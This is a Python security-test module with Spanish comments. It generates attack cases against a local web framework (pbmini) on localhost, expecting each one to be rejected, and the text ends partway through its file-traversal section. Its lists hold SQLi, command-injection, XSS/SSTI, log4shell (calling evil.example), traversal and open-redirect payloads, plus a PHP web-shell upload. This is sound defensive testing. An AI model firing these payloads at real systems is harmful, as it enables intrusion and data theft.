"""Fase de ataques contra el FRAMEWORK pbmini (rutas, parseo, auth por ruta, plantillas, archivos, caché).
Excluye a propósito la API nativa de PocketBase (/api/*). Patrones tomados de OWASP Top 10 / WSTG y de los
ataques web más usados: tampering de métodos, bypass de auth por ruta/cabecera, CSRF, inyección (SQLi/NoSQLi/
filtros/comandos/SSTI), XSS por contexto, open redirect, traversal y trucos de Windows, smuggling, DoS, fuzzing.
`build(L, ctx)` devuelve Cases; L es el módulo lab (Case, raw, ...). Solo corre contra 127.0.0.1 (sandbox del laboratorio).
"""
from html.parser import HTMLParser
import concurrent.futures, http.client, json, random, re, socket, time, urllib.parse

CE = (400, 401, 403, 404, 405, 413, 414, 415, 431)      # "rechazado de forma segura"
NO5 = tuple(range(200, 500))                             # "no hubo error de servidor"
REJ3 = (301, 302, 303, 307, 308)
UID = "abcdefghijklmno"


def sock(port, data, timeout=6, read=65536):
    """Envía bytes crudos y devuelve (primera línea de estado, cabeceras+cuerpo) o (None, motivo)."""
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
        s.sendall(data)
        buf = b""
        try:
            while len(buf) < read:
                ch = s.recv(8192)
                if not ch: break
                buf += ch
                if b"\r\n\r\n" in buf and len(buf) > 200: break
        except (socket.timeout, ConnectionResetError, OSError): pass
        s.close()
        txt = buf.decode("latin-1")
        return (txt.split("\r\n", 1)[0] if txt else None), txt
    except OSError as e: return None, f"{type(e).__name__}"


class _Danger(HTMLParser):
    """Parsea el HTML devuelto y lista lo ACTIVO: etiquetas ejecutables, atributos on*, URLs javascript:/data:. El texto escapado no cuenta."""
    TAGS = {"script", "img", "svg", "iframe", "object", "embed", "style", "link", "math", "base", "meta", "applet", "frame", "frameset"}
    URL = {"href", "src", "action", "formaction", "data", "xlink:href", "poster", "background"}
    def __init__(self): super().__init__(convert_charrefs=True); self.found = []
    def handle_starttag(self, tag, attrs):
        if tag in self.TAGS: self.found.append(f"<{tag}>")
        for k, v in attrs:
            if k.startswith("on"): self.found.append(f"{tag}[{k}]")
            if k in self.URL and v and re.match(r"\s*(javascript|data|vbscript):", v, re.I): self.found.append(f"{tag}[{k}={v[:20]}]")
    handle_startendtag = handle_starttag

def html_danger(body):
    p = _Danger()
    try: p.feed(body); p.close()
    except Exception: pass
    return p.found


def status_of(line):
    m = re.match(r"HTTP/\d\.\d (\d{3})", line or "")
    return int(m.group(1)) if m else 0


def build(L, ctx):
    Case, raw, port = L.Case, L.raw, ctx["port"]
    cases, n = [], [0]
    TOKA, TOKB, TOKSU = ctx["TOKA"], ctx["TOKB"], ctx["TOKSU"]
    A, SU = {"Authorization": TOKA}, {"Authorization": TOKSU}
    J = {"Content-Type": "application/json"}
    cookie = L.cookie

    def add(cat, obj, meta, path=None, **kw):
        n[0] += 1; cases.append(Case(f"S{n[0]:03d}", cat, obj, meta, path, **kw))

    def scn(cat, obj, meta, fn): add(cat, obj, meta, run=fn)

    # ---------------------------------------------------------------- S1. Tampering de métodos HTTP
    cat = "S1 · Métodos HTTP"
    METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE", "FOO", "PROPFIND"]
    PROT = [("/me", "user"), ("/mine", "user"), ("/whoami", "user"), ("/admin", "superuser"), ("/vault-su", "superuser"), ("/secure-post", "user"), (f"/users/{UID}/update", "user")]

    def methods_scn(path, creds):
        def f(_):
            bad = []
            for m in METHODS:
                r = raw(port, m, path, creds, "" if m in ("POST", "PUT", "PATCH", "DELETE") else None)
                if m == "OPTIONS" and r.status == 204 and not r.body.strip(): continue      # preflight nativo de CORS: sin datos
                if 200 <= r.status < 400 or r.status >= 500: bad.append(f"{m}→{r.status}")
            return not bad, ("; ".join(bad) or "ningún método obtuvo acceso")
        return f
    for path, lvl in PROT:
        scn(cat, f"Saltar auth cambiando el método en {path} (10 métodos, sin credenciales)", "Ningún método devuelve 2xx/3xx/5xx", methods_scn(path, {}))
    for path, lvl in PROT:
        if lvl == "superuser":
            scn(cat, f"Escalada por método en {path} con token de usuario normal", "Ningún método devuelve 2xx/3xx/5xx", methods_scn(path, A))

    def override_scn(ctx):
        bad = []
        for h in ({"X-HTTP-Method-Override": "POST"}, {"X-Method-Override": "POST"}, {"X-HTTP-Method": "POST"}, {"X-Original-Method": "POST"}):
            r = raw(port, "GET", f"/users/{UID}/update", {**A, **h})
            if r.status not in (404, 405) or "updated" in r.body: bad.append(f"{list(h)[0]}→{r.status}")
        r = raw(port, "GET", f"/users/{UID}/update?_method=POST", A)
        if r.status not in CE: bad.append(f"?_method→{r.status}")
        return not bad, "; ".join(bad) or "ninguna cabecera/parámetro cambia el método"
    scn(cat, "Method override (X-HTTP-Method-Override, _method) para ejecutar un POST desde un GET", "Se ignoran: GET sigue siendo 404/405", override_scn)
    add(cat, "HEAD a ruta solo-POST", "No es 2xx", "/secure-post", m="HEAD", h=A, st=(404, 405))
    add(cat, "TRACE (XST) con credenciales", "No se refleja la petición", "/me", m="TRACE", h=A, st=(404, 405, 400), hasnt=[TOKA[:20]])
    add(cat, "DELETE a página pública de lectura", "404/405, sin ejecutar el handler", f"/u/{UID}", m="DELETE", st=(404, 405))
    add(cat, "PUT a endpoint público de lectura", "404/405", "/health", m="PUT", st=(404, 405))

    # ---------------------------------------------------------------- S2. Bypass de autenticación
    cat = "S2 · Bypass de autenticación"
    creds = [{"Authorization": ""}, {"Authorization": "null"}, {"Authorization": "undefined"}, {"Authorization": "Bearer"}, {"Authorization": "Bearer "}, {"Authorization": "Bearer null"},
             {"Authorization": "Basic YWRtaW46YWRtaW4="}, {"Authorization": "Bearer " + "A" * 300}, {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJpZCI6IngifQ."},
             {"X-Auth-Token": TOKSU}, {"X-Token": TOKSU}, {"X-API-Key": TOKSU}, {"X-Access-Token": TOKSU}, {"Token": TOKSU}, {"X-Forwarded-User": "admin"}, {"X-User": "admin"}, {"Remote-User": "admin"},
             {"X-Original-User": "admin"}, {"X-Admin": "true"}, {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "X-Client-IP": "127.0.0.1"},
             {"Cookie": "admin=true; role=superuser; isAdmin=1; pb_auth=garbage"}, {"Cookie": f"token={TOKSU}"}, {"Cookie": f"pb_token={TOKSU}"}, {"Cookie": f"pb_auth={TOKSU}"},
             {"Cookie": "pb_auth=" + urllib.parse.quote(json.dumps({"token": TOKSU[::-1]}))}, {"Cookie": "pb_auth=" + urllib.parse.quote(json.dumps({"token": {"$ne": None}}))},
             {"Cookie": "pb_auth=" + urllib.parse.quote(json.dumps({"__proto__": {"token": TOKSU}}))}]

    def creds_scn(path):
        def f(_):
            bad = []
            for h in creds:
                r = raw(port, "GET", path, h)
                if r.status != 401 and r.status != 403: bad.append(f"{list(h)[0]}→{r.status}")
            for q in ("token", "auth", "access_token", "api_key", "pb_auth", "jwt"):
                r = raw(port, "GET", f"{path}?{q}={TOKSU}")
                if r.status not in CE: bad.append(f"?{q}→{r.status}")
            return not bad, "; ".join(bad) or f"{len(creds) + 6} variantes rechazadas"
        return f
    for path in ("/me", "/admin", "/mine", "/vault-su"):
        scn(cat, f"Credenciales falsas/mal formadas/en lugar equivocado contra {path}", "Siempre 401/403 (token en query/cabecera ajena/cookie cruda/JSON hostil)", creds_scn(path))

    def dup_auth(ctx):
        res = []
        for first, second, path in ((TOKA, TOKSU, "/admin"), ("garbage", TOKSU, "/admin"), (TOKSU, TOKA, "/admin")):
            line, txt = sock(port, f"GET {path} HTTP/1.1\r\nHost: x\r\nAuthorization: {first}\r\nAuthorization: {second}\r\nConnection: close\r\n\r\n".encode())
            res.append(status_of(line))
        ok = res[0] in (401, 403) and res[1] in (401, 403, 400)       # el segundo (superuser) nunca debe ganar si el primero es inválido/normal
        return ok, f"[usuario,su]→{res[0]}, [basura,su]→{res[1]}, [su,usuario]→{res[2]}"
    scn(cat, "Dos cabeceras Authorization (la segunda es de superuser)", "Gana la primera (nunca se promueve a superuser)", dup_auth)

    def dup_cookie(ctx):
        r1 = raw(port, "GET", "/admin", {"Cookie": cookie(TOKA)})
        r2 = raw(port, "GET", "/admin", {"Cookie": cookie(TOKA) + "; " + cookie(TOKSU)})
        r3 = raw(port, "GET", "/admin", {"Cookie": cookie("garbage") + "; " + cookie(TOKSU)})
        return (r1.status == 403 and r2.status == 403 and r3.status == 401), f"usuario→{r1.status}, [usuario,su]→{r2.status}, [basura,su]→{r3.status}"
    scn(cat, "Cookie tossing: pb_auth duplicada con la de superuser en segundo lugar", "Gana la primera; nunca se promueve a superuser", dup_cookie)

    # ---------------------------------------------------------------- S3. CSRF
    cat = "S3 · CSRF con cookie"
    host = f"127.0.0.1:{port}"
    good_origin = f"http://{host}"
    ck = {"Cookie": cookie(TOKA)}
    for h, why in (({"Origin": "https://evil.example"}, "Origin ajeno sin Sec-Fetch-Site (navegador antiguo/forzado)"), ({"Origin": "null"}, "Origin: null (iframe sandbox / data:)"),
                   ({"Origin": f"http://{host}.evil.example"}, "Origin con sufijo del host legítimo"), ({"Origin": f"http://evil.example:{port}"}, "Origin con otro host y mismo puerto"),
                   ({"Origin": "https://evil.example", "Sec-Fetch-Site": "same-origin"}, "Origin ajeno pero Sec-Fetch-Site mentiroso"),
                   ({"Referer": "https://evil.example/x"}, "Referer ajeno sin Origin"), ({"Sec-Fetch-Site": "cross-site"}, "Sec-Fetch-Site cross-site"),
                   ({"Sec-Fetch-Site": "same-site"}, "Sec-Fetch-Site same-site (subdominio hermano)")):
        for ct in ("text/plain", "application/x-www-form-urlencoded", "multipart/form-data; boundary=x", "application/json"):
            add(cat, f"CSRF por POST ({ct.split(';')[0]}): {why}", "401: la cookie no se acepta como credencial", "/secure-post", m="POST", h={**ck, **h, "Content-Type": ct}, d="", st=401)
    for m in ("PUT", "PATCH", "DELETE"):
        add(cat, f"CSRF con {m} y Origin ajeno", "No llega al handler (404/405/401)", "/secure-post", m=m, h={**ck, "Origin": "https://evil.example"}, d="", st=(401, 404, 405))
    add(cat, "POST legítimo con Origin propio", "200", "/secure-post", m="POST", h={**ck, "Origin": good_origin, "Sec-Fetch-Site": "same-origin"}, d="", st=200)
    add(cat, "POST con Authorization y Origin ajeno", "200 (la cabecera no es credencial ambiental)", "/secure-post", m="POST", h={**A, "Origin": "https://evil.example"}, d="", st=200)
    add(cat, "GET con cookie y Origin ajeno", "200 (los GET no cambian estado)", "/whoami", h={**ck, "Origin": "https://evil.example"}, st=200)

    # ---------------------------------------------------------------- S4. Content-Type y cuerpos hostiles
    cat = "S4 · Cuerpos y Content-Type"
    for ct, body, why in (("text/plain", '{"n":5}', "JSON como text/plain (CSRF 'simple')"), ("application/xml", "<n>5</n>", "XML"), ("application/x-www-form-urlencoded", '{"n":5}', "JSON con tipo form"),
                          ("application/json", '{"n":5', "JSON truncado"), ("application/json", "[1]", "array en raíz"), ("application/json", '"x"', "string en raíz"), ("application/json", "null", "null en raíz"),
                          ("application/json", "5", "número en raíz"), ("application/json", '{"n":5}x', "basura tras el JSON"), ("application/json", '{"n":5}{"n":6}', "dos documentos JSON"),
                          ("application/json", "{'n':5}", "comillas simples"), ("application/json", '{"n":NaN}', "NaN"), ("application/json", '{"n":1e999}', "desbordamiento float"),
                          ("application/json", '{"n":12345678901234567890}', "entero enorme"), ("application/json", '{"n":-0}', "-0 (se normaliza a 0)"), ("application/json", '{"n":5,/*c*/"note":"x"}', "comentario en JSON"),
                          ("application/json; charset=utf-7", '{"n":5}', "charset utf-7"), ("application/json", "", "cuerpo vacío"), ("", '{"n":5}', "sin Content-Type")):
        benign = why.startswith("-0") or why == "charset utf-7"      # normalizados/ignorados sin efecto: solo se exige "no 5xx"
        add(cat, f"Body hostil en /body: {why}", "Aceptado sin efecto o 400; jamás 5xx" if benign else "400 (o rechazo seguro); jamás 5xx", "/body", m="POST", h={"Content-Type": ct} if ct else {}, d=body, st=NO5 if benign else CE)
    add(cat, "JSON con claves duplicadas {n:1,n:6000}", "No 5xx (diferencial con WAF/proxy: ver observado)", "/body", m="POST", h=J, d='{"n":1,"n":6000}', st=NO5 + ())
    add(cat, "JSON anidado 100000 niveles (DoS de pila)", "400 sin tumbar el servidor", "/body", m="POST", h=J, d="[" * 100000 + "]" * 100000, st=CE)
    add(cat, "Objeto anidado en campo (n:{a:{a:...}})", "400", "/body", m="POST", h=J, d='{"n":' + '{"a":' * 500 + "1" + "}" * 500 + "}", st=CE)
    add(cat, "Cuerpo con bytes UTF-8 inválidos", "No 5xx", "/body", m="POST", h=J, d=b'\xff\xfe{"n":5}', st=CE)
    add(cat, "Body de 2 MiB contra el límite de 1 MiB", "413", "/body", m="POST", h=J, d='{"n":5,"note":"' + "x" * (2 * 1024 * 1024) + '"}', st=413)
    add(cat, "Content-Encoding: gzip con basura", "No 5xx", "/body", m="POST", h={**J, "Content-Encoding": "gzip"}, d=b"\x1f\x8b\x08garbage", st=CE)
    add(cat, "Form con __proto__[x] y n[]", "400", "/body", m="POST", h={"Content-Type": "application/x-www-form-urlencoded"}, d="n=5&__proto__[x]=1", st=400)
    add(cat, "Form con n y n[] (array)", "400", "/body", m="POST", h={"Content-Type": "application/x-www-form-urlencoded"}, d="n=5&n[]=6", st=400)
    add(cat, "Form con %00 y valores de control", "400", "/body", m="POST", h={"Content-Type": "application/x-www-form-urlencoded"}, d="n=%005&note=a%0d%0ab", st=400)
    mp = lambda extra: ("--B\r\nContent-Disposition: form-data; name=\"n\"\r\n\r\n5\r\n" + extra + "--B--\r\n")
    add(cat, "multipart/form-data válido con campo extra", "400 (mass assignment también por multipart)", "/body", m="POST", h={"Content-Type": "multipart/form-data; boundary=B"}, d=mp('--B\r\nContent-Disposition: form-data; name="admin"\r\n\r\n1\r\n'), st=400)
    add(cat, "multipart con archivo adjunto no declarado", "El archivo se descarta (no hay campo f): sin 5xx ni guardado", "/body", m="POST", h={"Content-Type": "multipart/form-data; boundary=B"}, d=mp('--B\r\nContent-Disposition: form-data; name="f"; filename="x.php"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET[0]);\r\n'), st=NO5, hasnt=["x.php"])
    add(cat, "multipart malformado", "No 5xx", "/body", m="POST", h={"Content-Type": "multipart/form-data; boundary=B"}, d="--B\r\nContent-Disposition: form-data; name=n\r\n\r\n5", st=CE + (200,))

    # ---------------------------------------------------------------- S5. Normalización de rutas contra rutas protegidas
    cat = "S5 · Normalización de rutas (bypass de auth)"
    def variants(base):
        b = base.lstrip("/")
        return [f"/{b}/", f"//{b}", f"/./{b}", f"/%2e/{b}", f"/{b}%00", f"/{b}%00.css", f"/{b};x=1", f"/{b}%2f", f"/{b}/.", f"/{b}/..;/{b}", f"/x/../{b}", f"//{b}//", f"/{b}%20", f"/{b}.", f"/{b}%09", f"/{b}%0a",
                f"/{b.upper()}", f"/%{ord(b[0]):02x}{b[1:]}", f"/{b}%2e", f"/{b}/%2e%2e/{b}", f"/%ef%bc%8f{b}", f"/{b}?x=1", f"/{b}#x", f"/{b}%23", f"/{b}%3f", f"/{b}/./", f"/..%2f{b}", f"/%2e%2e/{b}", f"\\{b}", f"/{b}\\", f"/{b}.json", f"/{b}.html"]
    for path in ("/me", "/admin", "/mine", "/vault-su"):
        def f(_, path=path):
            bad = []
            for v in variants(path):
                r = raw(port, "GET", v)
                if 200 <= r.status < 300 or r.status >= 500: bad.append(f"{v}→{r.status}")
                if r.status in REJ3:         # redirección de limpieza: seguirla sin credenciales tampoco debe dar acceso
                    loc = r.header("location") or ""
                    if loc.startswith("/"):
                        r2 = raw(port, "GET", loc)
                        if 200 <= r2.status < 300 or r2.status >= 500: bad.append(f"{v}→{r.status}→{r2.status}")
            return not bad, "; ".join(bad[:5]) or f"{len(variants(path))} variantes sin acceso"
        scn(cat, f"Evadir la auth de {path} con {len(variants(path))} variantes de ruta (//, ./, %2e, %00, ;, \\, mayúsculas, unicode...)", "Ninguna da 2xx ni 5xx, ni siguiendo las redirecciones de limpieza", f)

    # ---------------------------------------------------------------- S6. Open redirect
    cat = "S6 · Open redirect"
    TO = ["//evil.example", "/\\evil.example", "/\\/evil.example", "///evil.example", "/%09/evil.example", "https://evil.example", "HTTP://EVIL.EXAMPLE", "https:evil.example", "http:/evil.example",
          "javascript:alert(1)", "data:text/html,x", "\\\\evil.example", "\\/evil.example", " //evil.example", "\t//evil.example", "//evil.example%2f..", "/%2fevil.example", "/..//evil.example",
          "/.%2f/evil.example", "%2f%2fevil.example", "/?@evil.example", "//%65vil.example", "//evil。example", "／／evil.example", "/\u202e/evil.example", "/\r\n//evil.example", "/ok\\@evil.example",
          "mailto:a@evil.example", "file:///etc/passwd", "//[::1]", "//127.0.0.1", "//localhost", "/@evil.example"]

    def redirect_scn(ctx):
        bad = []
        for t in TO:
            r = raw(port, "GET", "/go?to=" + urllib.parse.quote(t, safe=""))
            loc = r.header("location")
            if loc is not None and not re.match(r"^/(?![/\\])[^\x00-\x1f\\]*$", loc): bad.append(f"{t!r}→Location {loc!r}")
            if r.status in REJ3 and loc is None: bad.append(f"{t!r}→{r.status} sin Location")
            if r.status >= 500 and r.status != 500: bad.append(f"{t!r}→{r.status}")
        return not bad, "; ".join(bad[:4]) or f"{len(TO)} destinos: ninguno produjo Location externo"
    scn(cat, f"{len(TO)} variantes de open redirect (barras, esquemas, unicode, CRLF, userinfo) en /go?to=", "Ninguna respuesta lleva Location externo; solo rutas relativas '/x'", redirect_scn)
    add(cat, "Redirect legítimo con query propia", "302 a /dashboard?x=1", "/go?to=" + urllib.parse.quote("/dashboard?x=1", safe=""), st=302)
    add(cat, "Doble codificación en el destino", "No se decodifica dos veces", "/go?to=%252f%252fevil.example", st=(302, 500), nohdr=[r"^location: //"])

    # ---------------------------------------------------------------- S7. XSS y SSTI
    cat = "S7 · XSS / inyección de plantillas"
    XSS = ["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>', "'><svg/onload=alert(1)>", "javascript:alert(1)", "<iframe srcdoc=<script>alert(1)</script>>", '"onmouseover="alert(1)', "' onfocus='alert(1)' autofocus='",
           "</title><script>alert(1)</script>", "<!--", "<![CDATA[x]]>", "<style>@import'//evil'</style>", "<math><mtext></form><form><mglyph><svg><mtext><style><path id=x onerror=alert(1)>", "<a href=javascript:alert(1)>x</a>",
           "&lt;script&gt;", "\\u003cscript\\u003e", "%3Cscript%3E", "<img src=x onerror=alert`1`>", "<body onload=alert(1)>", "<details open ontoggle=alert(1)>", "<scr<script>ipt>alert(1)</scr</script>ipt>",
           "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{.}}", '{{template "x"}}', "{{define \"title\"}}x{{end}}", "{{range .}}x{{end}}", "{{printf \"%s\" .User}}", "{{7*'7'}}", "{{config}}", "{{.Query}}", "[[7*7]]", "@(7*7)"]
    def xss_scn(ctx):
        bad = []
        base = html_danger(raw(port, "GET", "/hi?name=x").body)
        for p in XSS:
            r = raw(port, "GET", "/hi?name=" + urllib.parse.quote(p, safe=""))
            if r.status >= 500: bad.append(f"{p[:25]!r}→{r.status}"); continue
            extra = [d for d in html_danger(r.body) if d not in base]
            if extra: bad.append(f"{p[:25]!r}→HTML activo {extra[:2]}")
            if p in ("{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}") and ">Hola 49<" in r.body: bad.append(f"{p!r}→evaluado")
            if p == "{{.}}" and "map[" in r.body: bad.append("{{.}}→volcó el contexto")
        return not bad, "; ".join(bad[:4]) or f"{len(XSS)} payloads: ninguno produjo etiquetas/atributos/URLs activos (el texto sale escapado)"
    scn(cat, f"{len(XSS)} payloads XSS/SSTI reflejados en /hi?name=", "Salen escapados (&lt;) o 400; las plantillas nunca se evalúan", xss_scn)

    def stored_scn(ctx):
        bad = []
        for p in ("/", "/blog"):
            r = raw(port, "GET", p)
            d = html_danger(r.body)
            if d: bad.append(f"{p}→HTML activo {d[:3]}")
            if ">49<" in r.body: bad.append(f"{p}→SSTI evaluada")
            if r.status != 200: bad.append(f"{p}→{r.status}")
        r = raw(port, "GET", "/")
        links = re.findall(r'href="([^"]*)"', r.body)
        return not bad, "; ".join(bad[:4]) or f"{len(links)} enlaces revisados: los datos hostiles de la base salen escapados en texto, atributo y URL"
    scn(cat, "XSS almacenado: títulos y slugs hostiles de la base en texto, atributo href y URL", "Escapado por contexto; ningún href javascript:/data:, ninguna plantilla evaluada", stored_scn)
    add(cat, "JSON de datos hostiles: tipo y nosniff", "application/json + nosniff (no se interpreta como HTML)", "/posts-all", st=200, hdr=[r"^content-type: application/json", r"^x-content-type-options: nosniff"])
    add(cat, "Plantilla: variable inexistente / inyección en .Query", "Sin volcado del contexto ni de User", "/hi?name=%7B%7B.User%7D%7D", st=200, hasnt=["map[", "publicExport"])

    # ---------------------------------------------------------------- S8. Inyección (SQLi/NoSQLi/filtros/comandos/LFI/log4shell)
    cat = "S8 · Inyección en parámetros"
    INJ = ["' OR 1=1--", "\" OR \"\"=\"", "') OR ('1'='1", "'; DROP TABLE posts;--", "1 UNION SELECT * FROM _superusers", "admin'--", "x' || published = false || title='y", "x' && secret ~ 'S", "' || @collection._superusers.email ~ 'su' || '",
           "{\"$ne\":null}", "{\"$gt\":\"\"}", "[$ne]=1", "title[$ne]=x", "%", "_", "\\", "%27", "%00", "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "||", "&&", "~", "!~", "?=", "@request.auth.id", "@collection.users.email", "@now",
           ";id", "|id", "`id`", "$(id)", "&& whoami", "| cat /etc/passwd", "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "file:///etc/passwd", "\\\\127.0.0.1\\c$", "${jndi:ldap://evil.example/a}", "%{(#a=1)}",
           "{{constructor.constructor('return process')()}}", "__proto__", "constructor", "prototype", "\n", "\r\nX-Injected: 1", "%0d%0aSet-Cookie:%20x=1", "%0a", "A" * 5000, "%ff%fe", "\u0000", "𝕒𝕓𝕔"]
    TARGETS = [("/posts?title={}", "filtro enlazado"), ("/blog/{}", "slug"), ("/slug/{}", "slug"), ("/u/{}", "id"), ("/docs/{}", "comodín"), ("/search?tag={}", "query tipada"), ("/track?id={}", "query tipada"),
               ("/posts-one/{}", "id"), ("/users/{}", "id de carpeta"), ("/hi?name={}", "texto libre")]
    def inj_scn(tpl, _kind):
        def f(ctx):
            bad = []
            t0 = time.time()
            for p in INJ:
                r = raw(port, "GET", tpl.format(urllib.parse.quote(p, safe="")), timeout=10)
                if r.status >= 500: bad.append(f"{p[:20]!r}→{r.status}")
                elif r.status == 200 and "posts?title" in tpl and r.body.strip() not in ("[]",) : bad.append(f"{p[:20]!r}→cuerpo {r.body[:30]!r}")
                elif r.status in REJ3 and "location" in " ".join(h.lower() for h in r.hdrlines) and (r.header("location") or "").startswith("//"): bad.append(f"{p[:20]!r}→redirect externo")
                if re.search(r"root:|\[fonts\]|X-Injected|uid=", r.body) or r.header("x-injected") or "x=1" in (r.header("set-cookie") or ""): bad.append(f"{p[:20]!r}→eco/leak")
            dt = time.time() - t0
            if dt > 20: bad.append(f"lento ({dt:.1f}s): posible SLEEP/DoS")
            return not bad, "; ".join(bad[:4]) or f"{len(INJ)} payloads en {dt:.1f}s sin efecto"
        return f
    for tpl, kind in TARGETS:
        scn(cat, f"{len(INJ)} payloads de inyección (SQLi, NoSQLi, filtros PB, comandos, LFI, log4shell, CRLF) en {tpl.replace('{}', '‹payload›')}", "4xx o [] vacío; sin 5xx, sin eco, sin retardo, sin fuga", inj_scn(tpl, kind))
    add(cat, "Filtro con ~ y comodín % como valor", "[]: el valor enlazado no actúa como patrón abierto (solo coincide literal)", "/posts?title=%25", st=200, has=["[]"])
    add(cat, "Filtro con _ como valor", "[]", "/posts?title=_", st=200, has=["[]"])

    # ---------------------------------------------------------------- S9. Unicode / codificación
    cat = "S9 · Unicode y codificación"
    for p, why in (("/slug/h%C3%A9llo", "acento"), ("/slug/%EF%BD%88%EF%BD%85%EF%BD%8C%EF%BD%8C%EF%BD%8F", "fullwidth 'ｈｅｌｌｏ'"), ("/slug/hello%E2%80%8B", "zero-width space"), ("/slug/%E2%80%AEolleh", "override RTL"),
                   (f"/u/{UID[:-1]}%C2%AD", "soft hyphen"), ("/slug/%EF%BC%8F", "barra fullwidth"), ("/docs/%C0%AE%C0%AE/x", "overlong ../ UTF-8"), ("/docs/%E0%80%AE%E0%80%AE/x", "overlong 3 bytes"), ("/slug/%ff", "byte inválido"),
                   ("/slug/%80", "continuación suelta"), ("/slug/%u0068ello", "%u (IIS)"), ("/slug/%c1%9c", "overlong \\"), (f"/u/{UID}%EF%BC%8E", "punto fullwidth"), ("/docs/a%c0%afb", "overlong /"),
                   ("/slug/%F0%9F%98%80", "emoji"), ("/slug/%00", "NUL"), ("/slug/%0a", "LF"), ("/slug/a%0d%0ab", "CRLF"), ("/blog/%E2%80%8Bhello", "ZWSP al inicio"), ("/blog/Hello", "mayúscula"), ("/blog/hello%20", "espacio final")):
        add(cat, f"Parámetro con {why}", "404 (la lista blanca ASCII lo rechaza)", p, st=(404, 400), hasnt=["hello"] if "hello" in p and False else [])
    add(cat, "Query con unicode en clave", "400", "/search?p%C3%A1ge=2", st=400)
    add(cat, "Query con homógrafo de 'page'", "400", "/search?p%D0%B0ge=2", st=400)

    # ---------------------------------------------------------------- S10. Divulgación de información
    cat = "S10 · Divulgación de información"
    FILES = ["/.git/config", "/.git/HEAD", "/.env", "/.env.local", "/pb_hooks/main.pb.js", "/pb_hooks/lib/mini.js", "/pb_hooks/pages/index.js", "/lib/mini.js", "/lib/pages.js", "/pages/index.js", "/main.pb.js", "/routes.js",
             "/pb_data/data.db", "/pb_data/auxiliary.db", "/pb_data/data.db-wal", "/data.db", "/auxiliary.db", "/package.json", "/package-lock.json", "/node_modules/", "/log", "/pb_migrations/", "/robots.txt", "/server-status",
             "/debug", "/console", "/admin.php", "/wp-login.php", "/phpinfo.php", "/.DS_Store", "/backup.zip", "/index.js.bak", "/pages/index.js~", "/.hidden", "/_secret", "/_layout.html", "/_partials/nav.html",
             "/pages/_layout.html", "/pages/.hidden.js", "/Dockerfile", "/docker-compose.yml", "/security/mini/pages/_secret.js", "/.well-known/security.txt", "/.htaccess", "/web.config", "/id_rsa", "/config.json", "/sitemap.xml",
             "/assets/", "/assets/sub/", "/assets", "/assets/sub", "/assets/..", "/api/", "/api/collections/x/y/z"]
    def files_scn(ctx):
        bad = []
        for p in FILES:
            r = raw(port, "GET", p)
            if r.status in (200, 206) and (re.search(r"module\.exports|require\(|SQLite format|\$app|\$os|TOPSECRET|hunter2|SECRET-PAGE-LEAK|Index of|<title>Index", r.body)): bad.append(f"{p}→FUGA")
            elif r.status >= 500: bad.append(f"{p}→{r.status}")
            elif r.status == 200 and p not in ("/.well-known/security.txt",) and "<h1>idx</h1>" not in r.body: bad.append(f"{p}→200 inesperado")
        return not bad, "; ".join(bad[:5]) or f"{len(FILES)} rutas de reconocimiento: 404 / sin código ni datos"
    scn(cat, f"Reconocimiento: {len(FILES)} rutas clásicas (.git, .env, pb_data, código fuente, backups, listados, paneles)", "404 sin código, sin bases de datos, sin listado de directorios", files_scn)
    def errors_scn(ctx):
        r = raw(port, "GET", "/boom"); r2 = raw(port, "GET", "/go?to=//evil.example"); r3 = raw(port, "GET", "/u/BAD")
        txt = r.body + r2.body + r3.body + "".join(r.hdrlines + r2.hdrlines + r3.hdrlines)
        bad = [k for k in ("hunter2", "Error", "stack", "goja", "pb_hooks", "\\Users\\", "/home/", ".js:", "at ", "GoError", "panic") if k in txt]
        return not bad, f"términos filtrados: {bad}" if bad else "errores genéricos (sin pila, rutas ni mensajes internos)"
    scn(cat, "Errores 500 y 404: mensajes, pilas y rutas internas", "Cuerpo genérico; nada de Error/stack/rutas/goja", errors_scn)
    def headers_scn(ctx):
        bad = []
        for p in ("/blog", f"/u/{UID}", "/boom", "/nada"):
            r = raw(port, "GET", p); h = {k.lower(): v for k, v in r.headers}
            for k in ("server", "x-powered-by", "x-aspnet-version", "x-runtime"):
                if k in h: bad.append(f"{p}: {k}={h[k]}")
        return not bad, "; ".join(bad) or "sin cabeceras que revelen tecnología/versión"
    scn(cat, "Cabeceras que revelan servidor/versión", "Sin Server/X-Powered-By", headers_scn)

    # ---------------------------------------------------------------- S11. c.file: archivos, Windows y Range
    cat = "S11 · Archivos (ctx.file)"
    TR = ["PUB.TXT", "Pub.Txt", "pub.txt.", "pub.txt%20", "pub.txt::$DATA", "pub.txt:stream", "CON", "NUL", "COM1", "LPT1", "AUX", "PRN", "con.txt", "PUB~1.TXT", "PROGRA~1", "sub/../pub.txt", "sub%5c..%5cpub.txt",
          "C:/Windows/win.ini", "C%3a%5cWindows%5cwin.ini", "%2f%2f%3f%2fC:%2fWindows", "%5c%5c%3f%5cC:%5c", "....//....//outside/secret.txt", "..%00", ".%00", "sub/", "sub//a.txt", "./pub.txt", "%2e/pub.txt",
          "%2E%2E%2Foutside%2Fsecret.txt", "%252e%252e%252foutside", "..%c0%afoutside/secret.txt", "..%ef%bc%8foutside/secret.txt", "..%e0%80%afoutside", "%u002e%u002e/", "..;/outside/secret.txt", "pub.txt/", "pub.txt/.",
          "pub.txt/..", "pub.txt%2f", ".env", ".ENV", ".Env%20", "sub/.%00", "sub%00.txt", ".", "..", "%2e", "%2e%2e", "link.txt", "dirlink/secret.txt", "sub/a.txt/../../outside/secret.txt", "a" * 300, "x/" * 200 + "y"]
    def tr_scn(ctx):
        bad = []
        for t in TR:
            r = raw(port, "GET", "/assets/" + t)
            if re.search(r"TOP-SECRET|hunter2|\[fonts\]|for 16-bit", r.body): bad.append(f"{t[:30]}→FUGA")
            elif r.status == 200 and t not in ("./pub.txt", "%2e/pub.txt", "sub//a.txt"): bad.append(f"{t[:30]}→200")
